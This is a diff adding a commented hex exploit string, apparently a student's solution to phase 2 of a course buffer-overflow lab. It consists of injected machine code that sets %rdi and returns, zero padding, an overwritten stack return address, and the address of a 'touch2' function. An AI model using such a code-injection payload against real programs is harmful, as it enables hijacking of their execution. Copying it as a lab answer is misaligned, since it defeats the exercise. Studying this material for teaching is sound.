@@ -1,0 +1,14 @@
+/* address from creating phase2ans.txt */
+48 c7 c7 1b 91 ef 7f c3
+
+/* buffer is hex to dec, pad remaining with 0's */
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+
+/* %rsp minus buffer 0x28 in hexadecimal */
+08 c9 65 55 00 00 00 00
+
+/* touch2 address */
+08 15 40 00 00 00 00 00
